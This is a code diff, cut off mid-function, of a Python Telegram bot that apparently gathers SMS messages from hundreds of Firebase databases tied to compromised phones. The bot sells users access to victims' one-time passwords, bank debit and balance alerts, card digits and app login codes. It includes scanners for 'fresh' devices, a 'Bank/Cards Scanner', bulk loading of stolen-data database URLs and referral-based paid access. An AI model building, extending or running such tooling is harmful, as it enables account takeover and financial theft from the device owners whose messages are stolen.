@@ -3,8 +3,8 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
   FAST-SKIP LOGIC (HIT & RUN) | RAILWAY SMOOTH ENGINE
-  DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
-  5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
+  LIVE ERROR TRACKING | DEEP SYNC (150) | PLAYWRIGHT
+  1500+ PANELS AUTO-LOADER | ANTI-CRASH WEB SERVER
 ══════════════════════════════════════════════════════
 """
 
@@ -19,6 +19,7 @@ import asyncio
 import logging
 import warnings
 import traceback
+import html
 import gc
 from collections import deque
 from datetime import datetime
@@ -76,7 +77,6 @@ def extract_urls_from_files() -> list:
 
 RAW_URLS = list(set(extract_urls_from_files()))
 
-# Combine Vanguard DB + All Extracted DBs
 DATABASES = {"VANTAGE_MAIN": {"url": VANTAGE_DB, "auth": VANTAGE_AUTH}}
 for i, url in enumerate(RAW_URLS):
     if url != VANTAGE_DB:
@@ -115,7 +115,6 @@ GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SCAN_PROGRESS = {"total": len(DATABASES) if len(DATABASES) > 0 else 1, "completed": 0}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-# 🔥 RAILWAY SMOOTH ENGINE (RAM Protected) 🔥
 HTTP_SEMAPHORE = asyncio.Semaphore(40)
 WORKER_SEMAPHORE = asyncio.Semaphore(25)
 API_LOCK = asyncio.Lock()
@@ -230,7 +229,6 @@ def load_data():
                 sorted_res = list(n_map.values())
                 sorted_res.sort(key=lambda d: (0 if d.status == "online" else 1, d.numbers[0] if d.numbers else d.id))
                 GLOBAL_DEVICE_CACHE["ALL"] = sorted_res
-                
                 if len(sorted_res) > 50:
                     SCAN_PROGRESS["completed"] = 99999 
                     SCAN_PROGRESS["total"] = 99999
@@ -330,7 +328,6 @@ def extract_all_nums(*dicts) -> list[str]:
             if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
     return list(set(nums))
 
-# 🔥 VANTAGE BANK & CARDS EXTRACTORS 🔥
 OTP_PATTERNS = [re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE), re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), re.compile(r"(?<!\d)(\d{6})(?!\d)"), re.compile(r"(?<!\d)(\d{4})(?!\d)")]
 BANK_PATTERNS = [re.compile(r"(debited|credited|deducted|received|spent).*?(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE), re.compile(r"(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?).*?(debited|credited|deducted|received|spent)", re.IGNORECASE), re.compile(r"bal(?:ance)?\s*(?:is|:|-)?\s*(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)", re.IGNORECASE)]
 CARD_PATTERNS = [re.compile(r"(?:card|a/c|acct)[\s\w]*ending[\s\w]*(\d{4})", re.IGNORECASE), re.compile(r"card.*?(?:\*|x)+(\d{4})", re.IGNORECASE)]
@@ -415,7 +412,6 @@ async def fb_get(path: str, base: str, auth: str = None, query: str = "") -> Opt
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, query=query)
-            # 5-second timeout for deep data fetch to avoid hanging
             async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
                 if r.status == 200: return await r.json(content_type=None)
                 return None
@@ -426,7 +422,6 @@ async def fb_keys(path: str, base: str, auth: str = None) -> list[str]:
         try:
             session = await get_http_session()
             url = build_fb_url(base, path, auth=auth, shallow=True)
-            # 3-second FAST SKIP timeout for initial check
             async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                 if r.status == 200:
                     data = await r.json(content_type=None)
@@ -440,15 +435,12 @@ async def fetch_db_data(tag: str, db_config: dict) -> Optional[list[Device]]:
     
     async with WORKER_SEMAPHORE:
         try:
-            # FAST SKIP: Ping database first to see if it's alive and has useful data
             root_keys = await fb_keys("", url, auth)
-            if not root_keys: 
-                return [] # DB is dead/empty -> Skip immediately!
+            if not root_keys: return [] 
 
             devices_list = []
             added_set = set()
             
-            # Only scan if these specific tables exist
             if "All_Users" in root_keys or "user_data" in root_keys or "clients" in root_keys:
                 sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
                     fb_get("All_Users/simDetails", url, auth), 
@@ -538,11 +530,9 @@ async def check_force_sub(bot, user_id: int) -> bool:
 async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_func) -> bool:
     u = all_users.get(chat_id, {})
     if chat_id in ADMIN_IDS or u.get("has_global_access", False): return True
-    
     now = time.time()
     if now < u.get("access_until", 0) or now < u.get("global_trial_end", 0) or now < u.get("personal_trial_end", 0):
         return True
-        
     refs = u.get("referrals", 0)
     if refs >= 10:
         all_users[chat_id]["referrals"] -= 10
@@ -550,7 +540,6 @@ async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_fun
         save_user(chat_id)
         await reply_func("✅ <b>10 Referrals Redeemed!</b>\nAapka 24 Hours VIP Access unlock ho gaya hai.", parse_mode="HTML")
         return True
-        
     ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
     await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
     return False
@@ -739,6 +728,12 @@ def auto_forward_msg(sms: dict, num_label: str) -> str:
     if otp: return f"🔐 <b>NEW OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
     return f"📩 <b>NEW SMS RECEIVED</b>\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"
 
+def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
+        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
+    ])
+
 def admin_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel"), InlineKeyboardButton("Grant Global Access", callback_data="sa_grant_global")],
@@ -785,7 +780,7 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
 
     nav = []
     callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
-    if page > 0: nav.append(InlineKeyboardButton("⬅ Prev", callback_data=f"{callback_prefix}{page-1}"))
+    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{callback_prefix}{page-1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
     if nav: kb.append(nav)
@@ -940,9 +935,9 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Action cancelled. Session closed. Type /call to start over.")
     return ConversationHandler.END
 
-# ═══════════════════════════════════════════════════════
-#  CORE TELEGRAM HANDLERS
-# ═══════════════════════════════════════════════════════
+# ==========================================
+# 📩 CORE TELEGRAM HANDLERS (WITH GLOBAL ERROR TRACKING)
+# ==========================================
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
@@ -978,27 +973,27 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(f"🔥 VANTAGE PANEL + OMNIDIMENSION BOT 🔥\n━━━━━━━━━━━━━━━━━━\nWelcome {update.effective_user.first_name}!\n\n👉 Type: /call to launch AI Voice Agent\n👉 Or use the menu below for OTP & Bank Panel.", reply_markup=get_reply_menu(chat_id))
 
 async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
-    query   = update.callback_query
-    data    = query.data or ""
-    chat_id = query.message.chat_id
-    bot_token = ctx.bot.token
-    users_db = all_users
-
-    if data == "verify_sub":
-        if await check_force_sub(ctx.bot, chat_id):
-            await safe_edit(query, "✅ Channels Verified! Welcome to the Bot.")
-            await ctx.bot.send_message(chat_id, f"Welcome {query.from_user.first_name}!", reply_markup=get_reply_menu(chat_id))
-        else:
-            await query.answer("❌ Aapne abhi tak channels join nahi kiye hain!", show_alert=True)
-        return
-
-    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
-        await query.answer("Please join channels first!", show_alert=True)
-        return
-
-    await query.answer()
-
     try:
+        query   = update.callback_query
+        data    = query.data or ""
+        chat_id = query.message.chat_id
+        bot_token = ctx.bot.token
+        users_db = all_users
+
+        if data == "verify_sub":
+            if await check_force_sub(ctx.bot, chat_id):
+                await safe_edit(query, "✅ Channels Verified! Welcome to the Bot.")
+                await ctx.bot.send_message(chat_id, f"Welcome {query.from_user.first_name}!", reply_markup=get_reply_menu(chat_id))
+            else:
+                await query.answer("❌ Aapne abhi tak channels join nahi kiye hain!", show_alert=True)
+            return
+
+        if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
+            await query.answer("Please join channels first!", show_alert=True)
+            return
+
+        await query.answer()
+
         if data == "noop": return
         if data == "close_msg":
             try: await query.message.delete()
@@ -1266,379 +1261,389 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, text, reply_markup=kb)
             return
 
-    except Exception:
-        pass
+    except Exception as e:
+        err_msg = traceback.format_exc()
+        try:
+            await query.message.reply_text(f"⚠️ <b>BUTTON ERROR:</b>\n<pre>{html.escape(err_msg[-3000:])}</pre>", parse_mode="HTML")
+        except: pass
 
 async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    bot_token = ctx.bot.token
-    users_db = all_users
+    try:
+        chat_id = update.effective_chat.id
+        bot_token = ctx.bot.token
+        users_db = all_users
 
-    text = (update.message.text or "").strip()
+        text = (update.message.text or "").strip()
 
-    if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
-        await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
-        return
-
-    protected_commands = ["Devices List", "Manual Checker", "Scan Hidden Devices", "⚡ 5-Min Fresh Devices", "🔥 30-Min Fresh Devices", "🏦 Bank/Cards Scanner", "Search Number (God)", "🍔 App OTPs (24h)", "Auto-Check Panels"]
-    if text in protected_commands:
-        if not await enforce_access(ctx, chat_id, update.message.reply_text): return
-
-    if text == "Devices List":
-        devices = await get_all_devices(bot_token, chat_id, users_db)
-        header = f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n🟢 Online: {sum(1 for d in devices if d.status == 'online')}\n📊 Total: {len(devices)} Devices\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
-        await update.message.reply_text(header, reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
-        return
-
-    if text == "🏦 Bank/Cards Scanner":
-        wait_msg = await update.message.reply_text("⏳ Scanning all devices for recent Bank & UPI Transactions...")
-        devices = await get_all_devices(bot_token, chat_id, users_db)
-        bank_alerts = []
-        for d in devices[:40]: 
-            smss = await get_device_sms(d, limit=30)
-            for sms in smss:
-                body = sms.get("body") or sms.get("message") or ""
-                bank_info = extract_bank_info(body)
-                card_info = extract_card_info(body)
-                if bank_info or card_info:
-                    msg_b = bank_info if bank_info else ""
-                    msg_c = card_info if card_info else ""
-                    bank_alerts.append(f"📱 {d.numbers[0] if d.numbers else d.id[:6]}\n{msg_b} {msg_c}\nDate: {sms_date(sms)}\n")
-        
-        if not bank_alerts:
-            await safe_edit(wait_msg, "📭 No recent Bank/UPI SMS found across devices.")
+        if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
+            await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
             return
+
+        protected_commands = ["Devices List", "Manual Checker", "Scan Hidden Devices", "⚡ 5-Min Fresh Devices", "🔥 30-Min Fresh Devices", "🏦 Bank/Cards Scanner", "Search Number (God)", "🍔 App OTPs (24h)", "Auto-Check Panels"]
+        if text in protected_commands:
+            if not await enforce_access(ctx, chat_id, update.message.reply_text): return
+
+        if text == "Devices List":
+            devices = await get_all_devices(bot_token, chat_id, users_db)
+            header = f"<b>📱 OTP PANEL PRO DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n🟢 Online: {sum(1 for d in devices if d.status == 'online')}\n📊 Total: {len(devices)} Devices\n━━━━━━━━━━━━━━━━━━\n<i>Select a number below:</i>"
+            await update.message.reply_text(header, reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
+            return
+
+        if text == "🏦 Bank/Cards Scanner":
+            wait_msg = await update.message.reply_text("⏳ Scanning all devices for recent Bank & UPI Transactions...")
+            devices = await get_all_devices(bot_token, chat_id, users_db)
+            bank_alerts = []
+            for d in devices[:40]: 
+                smss = await get_device_sms(d, limit=30)
+                for sms in smss:
+                    body = sms.get("body") or sms.get("message") or ""
+                    bank_info = extract_bank_info(body)
+                    card_info = extract_card_info(body)
+                    if bank_info or card_info:
+                        msg_b = bank_info if bank_info else ""
+                        msg_c = card_info if card_info else ""
+                        bank_alerts.append(f"📱 {d.numbers[0] if d.numbers else d.id[:6]}\n{msg_b} {msg_c}\nDate: {sms_date(sms)}\n")
             
-        res = "🏦 <b>VANTAGE BANK & CARDS TRACKER</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(bank_alerts[:20])
-        await safe_edit(wait_msg, res, parse_mode="HTML")
-        return
-
-    if text == "Search Number (God)":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        pending_action[chat_id] = {"action": "search_number"}
-        await update.message.reply_text("SEARCH NUMBER (GOD MODE)\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below:\n\nCancel: /cancel")
-        return
-
-    if text == "⚡ 5-Min Fresh Devices":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
-        if not all_devices:
-            await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
-            return
-
-        wait_msg = await update.message.reply_text("⏳ <b>Fetching 5-Min Fresh Devices...</b>", parse_mode="HTML")
-        recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 300]
-        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
-        
-        valid_devs = []
-        for i in range(0, min(100, len(recent_ping)), 15):
-            batch = recent_ping[i:i+15]
-            verifications = await asyncio.gather(*[verify_recent_sms(d, 300) for d in batch])
-            for d, is_valid in zip(batch, verifications):
-                if is_valid: valid_devs.append(d.id)
-            if len(valid_devs) >= 25: break
-                
-        if not valid_devs:
-            await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 5 minutes me naya SMS nahi aaya hai.")
-            return
-            
-        user_fresh_cache[chat_id] = valid_devs
-        await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 5)
-        return
-
-    if text == "🔥 30-Min Fresh Devices":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
-        if not all_devices:
-            await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
-            return
-
-        wait_msg = await update.message.reply_text("⏳ <b>Fetching 30-Min Fresh Devices...</b>", parse_mode="HTML")
-        recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 3600]
-        recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
-        
-        valid_devs = []
-        for i in range(0, min(100, len(recent_ping)), 15):
-            batch = recent_ping[i:i+15]
-            verifications = await asyncio.gather(*[verify_recent_sms(d, 1800) for d in batch])
-            for d, is_valid in zip(batch, verifications):
-                if is_valid: valid_devs.append(d.id)
-            if len(valid_devs) >= 25: break
-                
-        if not valid_devs:
-            await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 30 minutes me naya SMS nahi aaya hai.")
-            return
-            
-        user_fresh_cache[chat_id] = valid_devs
-        await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 30)
-        return
-
-    if text == "Manual Checker":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
-        return
-
-    if text == "🍔 App OTPs (24h)":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
-        return
-
-    if text == "Auto-Check Panels":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
-        return
-
-    if text == "Scan Hidden Devices":
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        wait_msg = await update.message.reply_text("Scanning premium hidden devices (Searching 'Recharge/Validity')...\n\nChecking active devices, please wait...")
-        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
-        if not devices: devices = await get_all_devices(bot_token, 0, users_db)
-        target_devices = [d for d in devices if not d.numbers]
-        if not target_devices:
-            await safe_edit(wait_msg, "Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
-            return
-            
-        results, kb, found_count = [], [], 0
-        phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
-        for d in target_devices[:100]: 
-            smss = await get_device_sms(d, limit=10)
-            found_nums, sample_sms = set(), ""
-            for sms in smss:
-                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
-                if any(x in body.lower() for x in ["recharge", "validity", "balance"]):
-                    for m in phone_pattern.findall(body):
-                        found_nums.add(m)
-                        if not sample_sms: sample_sms = body[:40].replace('\n', ' ') + "..."
-            if found_nums:
-                found_count += 1
-                results.append(f"Device: {d.name} ({d.id[:6]})\nPossible Nums: {', '.join(found_nums)}\nSMS: {sample_sms}\n")
-                if len(kb) < 90: kb.append([InlineKeyboardButton(f"View Inbox: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
-                    
-        if found_count == 0:
-            await safe_edit(wait_msg, "Scanning complete. Koi active recharge wala hidden number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Home", callback_data="home")]]))
-            return
-            
-        kb.append([InlineKeyboardButton("Back to Home", callback_data="home")])
-        results_text = "DEEP SCAN RESULTS (Premium)\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
-        if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
-        await safe_edit(wait_msg, results_text, reply_markup=InlineKeyboardMarkup(kb))
-        return
-
-    if text == "Check Status" and chat_id in ADMIN_IDS:
-        online_count = sum(1 for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.status == "online")
-        msg = f"📊 <b>SERVER HEALTH STATUS</b>\n━━━━━━━━━━━━━━━━━━\n" \
-              f"🔗 Auto-Loaded Panels: {len(RAW_URLS)}\n" \
-              f"📱 Total Devices in Cache: {len(GLOBAL_DEVICE_CACHE.get('ALL', []))}\n" \
-              f"🟢 Online Devices: {online_count}\n" \
-              f"👤 Total Bot Users: {len(all_users)}\n" \
-              f"📩 Total OTPs Processed: {total_otps_processed}\n" \
-              f"👻 Active Background Workers: {len(ACTIVE_WORKERS)}"
-        await update.message.reply_text(msg, parse_mode="HTML")
-        return
-
-    if text == "🎁 Redeem Promo":
-        pending_action[chat_id] = {"action": "redeem_promo"}
-        await update.message.reply_text("🎁 <b>REDEEM PROMO CODE</b>\n━━━━━━━━━━━━━━━━━━\nApna Promo Code niche type karein:\n\nCancel: /cancel", parse_mode="HTML")
-        return
-
-    if text.startswith("💳 Add Panel") or text.startswith("Add Panel"):
-        pending_action[chat_id] = {"action": "set_personal_db"}
-        await update.message.reply_text("💳 ADD CUSTOM PANEL (VANTAGE MODE)\n━━━━━━━━━━━━━━━━━━\nApne Firebase URLs bhejein (URL|AuthToken format).\nExample:\nhttps://sannn-5d617-default-rtdb.firebaseio.com|tHe daRk\n\nCancel: /cancel")
-        return
-
-    if text == "Admin Panel" and chat_id in ADMIN_IDS:
-        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
-        total_u = len(all_users)
-        msg = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total_u}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
-        await update.message.reply_text(msg, reply_markup=admin_keyboard())
-        return
-
-    if text.lower() in ("/cancel", "cancel"):
-        if chat_id in pending_action:
-            pending_action.pop(chat_id)
-            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
-        else: await update.message.reply_text("No pending action to cancel.")
-        return
-
-    if update.message.document:
-        state = pending_action.get(chat_id)
-        if state and state.get("action") == "upload_panels_txt" and chat_id in ADMIN_IDS:
-            doc = update.message.document
-            if not doc.file_name.endswith('.txt'):
-                await update.message.reply_text("❌ Please send a valid .txt file.")
+            if not bank_alerts:
+                await safe_edit(wait_msg, "📭 No recent Bank/UPI SMS found across devices.")
                 return
+                
+            res = "🏦 <b>VANTAGE BANK & CARDS TRACKER</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(bank_alerts[:20])
+            await safe_edit(wait_msg, res, parse_mode="HTML")
+            return
+
+        if text == "Search Number (God)":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            pending_action[chat_id] = {"action": "search_number"}
+            await update.message.reply_text("SEARCH NUMBER (GOD MODE)\n━━━━━━━━━━━━━━━━━━\nType the number you want to find below:\n\nCancel: /cancel")
+            return
+
+        if text == "⚡ 5-Min Fresh Devices":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            if not all_devices:
+                await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
+                return
+
+            wait_msg = await update.message.reply_text("⏳ <b>Fetching 5-Min Fresh Devices...</b>", parse_mode="HTML")
+            recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 300]
+            recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
             
-            wait_msg = await update.message.reply_text("⏳ Processing file, extracting URLs...")
-            try:
-                file = await ctx.bot.get_file(doc.file_id)
-                file_content = await file.download_as_bytearray()
-                text_data = file_content.decode('utf-8', errors='ignore')
-                
-                pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
-                urls = list(set(pattern.findall(text_data)))
-                
-                if not urls:
-                    await safe_edit(wait_msg, "❌ Is file mein koi valid Firebase URLs nahi mile.")
-                    return
+            valid_devs = []
+            for i in range(0, min(100, len(recent_ping)), 15):
+                batch = recent_ping[i:i+15]
+                verifications = await asyncio.gather(*[verify_recent_sms(d, 300) for d in batch])
+                for d, is_valid in zip(batch, verifications):
+                    if is_valid: valid_devs.append(d.id)
+                if len(valid_devs) >= 25: break
                     
-                existing = SETTINGS.setdefault("global_panels", [])
-                added_count = 0
-                for u in urls:
-                    if u not in existing and u not in RAW_URLS:
-                        existing.append(u)
-                        added_count += 1
+            if not valid_devs:
+                await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 5 minutes me naya SMS nahi aaya hai.")
+                return
+                
+            user_fresh_cache[chat_id] = valid_devs
+            await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 5)
+            return
+
+        if text == "🔥 30-Min Fresh Devices":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            if not all_devices:
+                await update.message.reply_text("⏳ System is booting up or loading cache. Please wait a few seconds and click again.")
+                return
+
+            wait_msg = await update.message.reply_text("⏳ <b>Fetching 30-Min Fresh Devices...</b>", parse_mode="HTML")
+            recent_ping = [d for d in all_devices if d.numbers and d.status == "online" and (time.time() - (d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000)) <= 3600]
+            recent_ping.sort(key=lambda d: d.timestamp, reverse=True)
+            
+            valid_devs = []
+            for i in range(0, min(100, len(recent_ping)), 15):
+                batch = recent_ping[i:i+15]
+                verifications = await asyncio.gather(*[verify_recent_sms(d, 1800) for d in batch])
+                for d, is_valid in zip(batch, verifications):
+                    if is_valid: valid_devs.append(d.id)
+                if len(valid_devs) >= 25: break
+                    
+            if not valid_devs:
+                await safe_edit(wait_msg, "❌ Koi bhi online number par pichle 30 minutes me naya SMS nahi aaya hai.")
+                return
+                
+            user_fresh_cache[chat_id] = valid_devs
+            await show_fresh_page(wait_msg, chat_id, 0, bot_token, users_db, 30)
+            return
+
+        if text == "Manual Checker":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
+            return
+
+        if text == "🍔 App OTPs (24h)":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            await update.message.reply_text("🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
+            return
+
+        if text == "Auto-Check Panels":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
+            return
+
+        if text == "Scan Hidden Devices":
+            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
+            wait_msg = await update.message.reply_text("Scanning premium hidden devices (Searching 'Recharge/Validity')...\n\nChecking active devices, please wait...")
+            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
+            if not devices: devices = await get_all_devices(bot_token, 0, users_db)
+            target_devices = [d for d in devices if not d.numbers]
+            if not target_devices:
+                await safe_edit(wait_msg, "Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
+                return
+                
+            results, kb, found_count = [], [], 0
+            phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
+            for d in target_devices[:100]: 
+                smss = await get_device_sms(d, limit=10)
+                found_nums, sample_sms = set(), ""
+                for sms in smss:
+                    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
+                    if any(x in body.lower() for x in ["recharge", "validity", "balance"]):
+                        for m in phone_pattern.findall(body):
+                            found_nums.add(m)
+                            if not sample_sms: sample_sms = body[:40].replace('\n', ' ') + "..."
+                if found_nums:
+                    found_count += 1
+                    results.append(f"Device: {d.name} ({d.id[:6]})\nPossible Nums: {', '.join(found_nums)}\nSMS: {sample_sms}\n")
+                    if len(kb) < 90: kb.append([InlineKeyboardButton(f"View Inbox: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                         
-                save_settings()
-                pending_action.pop(chat_id)
-                
-                for u in urls:
-                    try:
-                        WORK_QUEUE.put_nowait(("INIT", f"G_TXT_{int(time.time())}_{added_count}", {"url": u, "auth": None}))
-                    except asyncio.QueueFull: pass
-                    
-                await safe_edit(wait_msg, f"✅ <b>SUCCESS!</b>\n━━━━━━━━━━━━━━━━━━\nTotal URLs Extracted: {len(urls)}\nNewly Added to Global: {added_count}\n\n<i>Ab ye saare panels background me active ho gaye hain!</i>", parse_mode="HTML")
-            except Exception as e:
-                await safe_edit(wait_msg, f"❌ Error processing file: {str(e)}")
-        return
-
-    state = pending_action.get(chat_id)
-    if not state: return
-
-    action = state.get("action")
-    if action == "redeem_promo":
-        pending_action.pop(chat_id)
-        if text.upper() == "HACKER50":
-            all_users[chat_id]["access_until"] = time.time() + 3600
-            save_user(chat_id)
-            await update.message.reply_text("🎉 <b>Promo Redeemed!</b> Aapko 1 Hour ka Extra VIP Access mil gaya hai.", parse_mode="HTML")
-        else:
-            await update.message.reply_text("❌ Invalid or Expired Promo Code.")
-        return
-
-    if action == "search_number":
-        pending_action.pop(chat_id)
-        search_terms = [re.sub(r"\D", "", t) for t in text.replace(",", " ").split() if len(re.sub(r"\D", "", t)) >= 4]
-        if not search_terms:
-            await update.message.reply_text("Enter at least 4 digits to search.")
-            return
-        wait_msg = await update.message.reply_text("Searching across all global and user databases...")
-        devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
